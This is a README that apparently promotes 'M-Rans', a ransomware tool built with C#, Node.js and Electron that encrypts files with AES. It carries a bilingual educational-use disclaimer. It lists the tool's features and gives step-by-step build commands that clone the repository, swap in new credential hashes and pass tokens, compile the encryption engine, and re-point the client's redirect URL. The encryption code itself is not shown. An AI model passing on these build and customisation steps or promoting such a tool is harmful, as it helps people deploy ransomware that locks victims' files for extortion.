# M-Rans

### M-Rans
⚠️ Disclaimer :

I am not responsible for any illegal or inappropriate use of this application/program/tool. This software is provided for educational and research purposes only. Any use that violates laws or infringes on the rights of others is solely the responsibility of the user. I bear no legal or ethical responsibility for any damage or losses resulting from misuse.

This tool is specifically designed for learning and research purposes. It helps security experts and researchers verify the safety of applications and ensure they are free from malicious files.

Users must comply with local and international laws when using this software, and any violation of these laws is at their own risk.

<br/>

**⚠️ إخلاء مسؤولية** : أنا غير مسؤول عن أي استخدام غير قانوني أو غير لائق لهذا التطبيق/البرنامج/الأداة. يتم توفير هذا البرنامج لأغراض تعليمية وتجريبية فقط، وأي استخدام يخالف القوانين أو ينتهك حقوق الآخرين يقع على عاتق المستخدم وحده. لا أتحمل أي مسؤولية قانونية أو أخلاقية عن أي ضرر أو خسائر تنجم عن إساءة الاستخدام. تم تصميم هذا خصيصا لاغراض التعلم و الابحاث , يساعد هذا المنشور الخبراء الامنين و باحثي الامن على التحقق من سلامة التطبيقات و خلوها من الملفات الضارة.

يجب على المستخدمين الالتزام بالقوانين المحلية والدولية عند استخدام هذا البرنامج، وأي انتهاك لتلك القوانين يكون على مسؤوليتهم الخاصة.


<br/>
<div align="center">
  <img src="https://files.catbox.moe/2x1ppg.png" width="250px">
</div>

<div align="center">
  <h3>M-Rans | Ransomware "For security purposes only"</h3>
</div>

> [!CAUTION]  
> M-Rans is not for sale or use. It is designed solely for learning advanced malware techniques!

<div align="center">
  <img src="https://files.catbox.moe/2umcuy.jpg" width="860px">
</div>

---

### 💡 Description:
M-Rans is an advanced ransomware tool built with `C#` and `NodeJs` by [Meed](https://www.facebook.com/hack.meplz/).  
It leverages the **Electron.js** framework for the user interface and **.NET** for core functionalities, while using optimized **C++ functions** to maximize performance.  

The ransomware utilizes the robust `AES` encryption algorithm to securely encrypt files at exceptional speed.  
Encryption is powered by **M-Engine**, a custom-built encryption engine designed and developed by **Meed** to deliver high-speed encryption while maintaining strong security standards.  

---

<img src="https://github.com/user-attachments/assets/15c48195-e9f0-445b-8e67-224e3ab3d0da">

### 🚀 **Features:**
- 🔒 **High-Speed AES Encryption:** Ensures data security with minimal processing time.  
- ⚡ **Powered by M-Engine:** A highly efficient encryption core developed from scratch.  
- 🖥️ **Cross-Platform Support:** Leverages **Electron.js** for a modern and responsive UI.  
- 🧩 **Low-Level Optimization:** Uses **C++ functions** for critical tasks to boost performance.  
- 🪟 **Interactive User Interface:** Clean and intuitive design for enhanced usability.  

---

### 🛠️ **Technologies Used:**
- **Programming Languages:** C#, NodeJs  
- **Frameworks:** Electron.js, .NET  
- **Encryption Algorithm:** AES (Advanced Encryption Standard)  
- **Custom Engine:** M-Engine (High-Speed Encryption)  

---

### 🚨 **Legal Notice:**
M-Rans is a private tool intended solely for educational and research purposes.  
Any unauthorized or malicious use of this tool is strictly prohibited and may result in severe legal consequences.  
The developer does not assume responsibility for any misuse of this tool.  

---

### 🛠️ **Build :**

```
git clone https://h1ack.me/h1ack/M-Rans.git

cd M-Rans/M-Engine

(Get-Content config.cs) -replace '\$2a\$12\$xp7Fk0XBRwnxC1x4ibYFWe6sr..PFYkfLd0l/E060l27W4ggUrNVS', 'NEW_BCRYPT_HASH' | Set-Content config.cs

(Get-Content config.cs) -replace 'PASS-KEY-HERE', 'YOUR_NEW_PASS_TOKEN' | Set-Content config.cs

dotnet build # Build M-Engine

# if error here make sure the paths is "./bin/Debug/netX.X/M-Engine.exe"
Copy-Item -Path "./bin/Debug/netX.X/M-Engine.exe" -Destination "../resources" 

(Get-Content ./assetes/index-Ba9fV0lF.js) -replace 'https://h1ack.me', 'YOUR_NEW_REDIRECT_URL' | Set-Content ./assetes/index-Ba9fV0lF.js

npm run build # Build client - electron.js
```



### 📧 **Contact:**
For more information or educational inquiries, reach out to **[Meed](https://www.facebook.com/hack.meplz/)**.  
email : meed@h1ack.me

M-Rans.
